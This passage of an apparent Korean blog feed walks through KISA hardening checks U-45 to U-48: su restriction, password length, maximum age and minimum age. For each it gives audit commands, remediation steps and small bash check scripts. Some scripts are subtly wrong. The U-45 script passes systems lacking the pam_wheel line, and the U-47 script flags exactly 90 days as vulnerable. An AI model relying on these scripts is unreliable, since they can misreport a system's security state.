    <title>[주요정보통신기반시설 취약점 진단 가이드] U-45 root 계정 su 제한</title>
    <url>/2022/01/18/2022-01-18-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-45%20root%20%EA%B3%84%EC%A0%95%20su%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>su</code> 명령어 사용을 허용하는 사용자를 지정한 그룹이 설정되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-45</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>su</code> 관련 그룹만 <code>su</code> 명령어 사용 권한이 부여되어 있는지 점검하여 <code>su</code> 그룹에 포함되지 않은 일반 사용자의 <code>su</code> 명령 사용을 원천적으로 차단하는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>무분별한 사용자 변경으로 타 사용자 소유의 파일을 변경할 수 있으며 root 계정으로 변경하는 경우 관리자 권한을 획득할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>su</code> 명령어를 특정 그룹에 속한 사용자만 사용하도록 제한되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>su</code> 명령어를 모든 사용자가 사용하도록 설정되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) <code>wheel</code> 그룹 및 그룹 내 구성원 존재 여부 확인<br />    <code># cat /etc/group</code><br /><br />2) <code>wheel</code> 그룹이 <code>su</code> 명령어를 사용할 수 있는지 설정 여부 확인<br />    [SOLARIS] <code># ls -al /usr/bin/su</code><br />    [AIX] <code># cat /etc/security/user</code> default의 <code>sugroup-staff</code> 설정 확인<br />    [HP-UX] <code># vi /etc/default/security</code>의 <code>SU_ROOT_GROUP=wheel</code> 설정 확인<br /><br />3) 파일 권한 확인<br />    <code># ls -l /usr/bin/su</code></td>
</tr>
<tr>
<td>LINUX PAM<br />모듈 이용 시</td>
<td>1) <code>wheel</code> 그룹 및 그룹 내 구성원 존재 여부 확인<br />    <code># cat /etc/group</code><br /><br />2) 허용 그룹 설정 여부 확인<br />    <code># cat /etc/pam.d/su</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/pam.d/su | grep &quot;pam_wheel.so use_uid&quot;</p>
</blockquote>
<br>

<p>root 이외의 계정에서 UID가 0인 계정이 있는지 검색해보았습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-45/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX,<br />HP-UX</td>
<td>1) <code>wheel</code> group 생성<br />    <code># groupadd wheel</code><br /><br />2) <code>su</code> 명령어 그룹 변경<br />    <code># chgrp wheel /usr/bin/su</code><br /><br />3) <code>su</code> 명령어 사용권한 변경<br />    <code># chmod 4750 /usr/bin/su</code><br /><br />4) <code>wheel</code> 그룹에 <code>su</code> 명령 허용 계정 등록<br />    <code># usermod -G wheel &lt;user_name&gt;</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) <code>wheel</code> group 생성<br />    <code># mkgroup wheel</code><br /><br />2) <code>su</code> 명령어 그룹 변경<br />    <code># chgrp wheel /usr/bin/su</code><br /><br />3) <code>su</code> 명령어 사용권한 변경<br />    <code># chmod 4750 /usr/bin/su</code><br /><br />4) <code>wheel</code> 그룹에 <code>su</code> 명령 허용 계정 등록<br />    <code># chgroup users=&lt;user_name&gt; wheel</code></td>
</tr>
<tr>
<td>LINUX PAM<br />모듈 이용 시</td>
<td>1) <code>/etc/pam.d/su</code> 파일 주석 제거<br />    auth sufficient /lib/security/pam_rootok.so<br />    auth required /lib/security/pam_wheel.so debug group=wheel<br />    auth sufficient /lib/security/$ISA/pam_rootok.so <br />    auth required /lib/security/$ISA/pam_wheel.so use_uid<br /><br />2) <code>wheel</code> 그룹에 <code>su</code> 명령어를 사용할 사용자 추가<br />    <code># usermod -G wheel &lt;user_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/pam.d/su | grep <span class="string">&quot;pam_wheel.so use_uid&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;#&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-45 [root 계정 su 제한] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-45.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/pam.d/su</code> 파일에 있는 설정 구문이 주석 처리되어 있을 경우 <code>취약</code>, 아니라면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-45</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-45/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-46 패스워드 최소 길이 설정</title>
    <url>/2022/01/19/2022-01-19-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-46%20%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C%20%EC%B5%9C%EC%86%8C%20%EA%B8%B8%EC%9D%B4%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 정책에 패스워드 최소 길이 설정이 적용되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-46</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>패스워드 최소 길이 설정이 적용되어 있는지 점검하여 짧은 패스워드 길이로 발생하는 취약점을 이용한 공격에 대한 대비가 되어 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>패스워드 문자열이 짧은 경우 유추가 가능할 수 있으며 암호화된 패스워드 해시값을 무작위 대입공격, 사전대입 공격 등으로 단시간에 패스워드 크렉이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 패스워드 최소 길이가 8자 이상으로 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 패스워드 최소 길이가 8자 미만으로 설정되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># cat /etc/default/passwd</code><br />    <code>PASSLENGTH=8</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code># cat /etc/login.defs</code><br />    <code>PASS_MIN_LEN 8</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/security/user</code><br />    <code>minlen=8</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># cat /etc/default/security</code><br />    <code>MIN_PASSWORD_LENGTH=8</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/login.defs | grep &quot;PASS_MIN_LEN&quot; | grep -v &quot;#&quot;</p>
</blockquote>
<br>

<p><code>/etc/login.defs</code> 파일에 설정된 최소 패스워드 길이입니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-46/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/passwd</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASSLENGTH=6</code><br />    (수정 후) <code>PASSLENGTH=8</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/login.defs</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASS_MIN_LEN 6</code><br />    (수정 후) <code>PASS_MIN_LEN 8</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>minlen=4</code><br />    (수정 후) <code>minlen=8</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/security</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>MIN_PASSWORD_LENGTH=</code><br />    (수정 후) <code>MIN_PASSWORD_LENGTH=8</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/login.defs | grep <span class="string">&quot;PASS_MIN_LEN&quot;</span> | grep -v <span class="string">&quot;#&quot;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -lt 8 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-46 [패스워드 최소 길이 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-46.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/login.defs</code> 파일에 있는 설정 구문에서 숫자만 가져와서 8보다 작으면 <code>취약</code>, 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-46</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-46/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-47 패스워드 최대 사용기간 설정</title>
    <url>/2022/01/19/2022-01-19-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-47%20%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C%20%EC%B5%9C%EB%8C%80%20%EC%82%AC%EC%9A%A9%EA%B8%B0%EA%B0%84%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 정책에 패스워드 최대 사용기간 설정이 적용되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-47</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>패스워드 최대 사용 기간 설정이 적용되어 있는지 점검하여 시스템 정책에서 사용자 계정의 장기간 패스워드 사용을 방지하고 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>패스워드 최대 사용기간을 설정하지 않은 경우 비인가자의 각종 공격을 시도할 수 있는 기간 제한이 없으므로 공격자 입장에서는 장기적인 공격을 시행할 수 있어 시행한 기간에 비례하여 사용자 패스워드가 유출될 수 있는 확률이 증가합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 패스워드 최대 사용기간이 90일 이하로 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 패스워드 최대 사용기간이 90일 이하로 설정되어 있는 않는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># cat /etc/default/passwd</code><br />    <code>MAXWEEKS=12</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code># cat /etc/login.defs</code><br />    <code>PASS_MAX_DAYS 90</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/security/user</code><br />    <code>maxage=12</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># cat /etc/default/security</code><br />    <code>PASSWORD_MAXDAYS=90</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/login.defs | grep &quot;PASS_MAX_DAYS&quot; | grep -v &quot;#&quot;</p>
</blockquote>
<br>

<p><code>/etc/login.defs</code> 파일에 설정된 패스워드 최대 사용기간입니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-47/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/passwd</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>MAXWEEKS=</code><br />    (수정 후) <code>MAXWEEKS=12</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/login.defs</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASS_MAX_DAYS 99999</code><br />    (수정 후) <code>PASS_MAX_DAYS 90</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>maxage=0</code><br />    (수정 후) <code>maxage=12</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/security</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASSWORD_MAXDAYS=99999</code><br />    (수정 후) <code>PASSWORD_MAXDAYS=90</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/login.defs | grep <span class="string">&quot;PASS_MAX_DAYS&quot;</span> | grep -v <span class="string">&quot;#&quot;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -lt 90 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-47 [패스워드 최대 사용기간 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-47.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/login.defs</code> 파일에 있는 설정 구문에서 숫자만 가져와서 90보다 크면 <code>취약</code>, 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-47</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-47/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-48 패스워드 최소 사용기간 설정</title>
    <url>/2022/01/19/2022-01-19-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-48%20%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C%20%EC%B5%9C%EC%86%8C%20%EC%82%AC%EC%9A%A9%EA%B8%B0%EA%B0%84%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 정책에 패스워드 최소 사용기간 설정이 적용되어 있는지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-48</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>사용자가 자주 패스워드를 변경할 수 없도록 하고 관련 설정과 함께 시스템에 적용하여 패스워드 변경 전에 사용했던 패스워드를 재사용 할 수 없도록 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>최소 사용기간이 설정되어 있지 않아 반복적으로 즉시 변경이 가능한 경우 이전 패스워드 기억 횟수를 설정하여도 반복적으로 즉시 변경하여 이전 패스워드로 설정이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 패스워드 최소 사용기간이 1일 이상 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 패스워드 최소 사용기간이 설정되어 있지 않는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code># cat /etc/default/passwd</code><br />    <code>MINWEEKS=1</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code># cat /etc/login.defs</code><br />    <code>PASS_MIN_DAYS 1</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code># cat /etc/security/user</code><br />    <code>minage=1</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># cat /etc/default/security</code><br />    <code>PASSWORD_MINDAYS=1</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/login.defs | grep &quot;PASS_MIN_DAYS&quot; | grep -v &quot;#&quot;</p>
</blockquote>
<br>

<p><code>/etc/login.defs</code> 파일에 설정된 패스워드 최소 사용기간입니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-48/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/passwd</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>MINWEEKS=</code><br />    (수정 후) <code>MINWEEKS=1</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/login.defs</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASS_MIN_DAYS</code><br />    (수정 후) <code>PASS_MIN_DAYS 1</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>minage</code><br />    (수정 후) <code>minage=1</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/default/security</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>PASSWORD_MINDAYS=</code><br />    (수정 후) <code>PASSWORD_MINDAYS=1</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/login.defs | grep <span class="string">&quot;PASS_MIN_DAYS&quot;</span> | grep -v <span class="string">&quot;#&quot;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -lt 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-48 [패스워드 최소 사용기간 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-48.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/login.defs</code> 파일에 있는 설정 구문에서 숫자만 가져와서 1보다 작으면 <code>취약</code>, 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-48</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-48/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-49 불필요한 계정 제거</title>
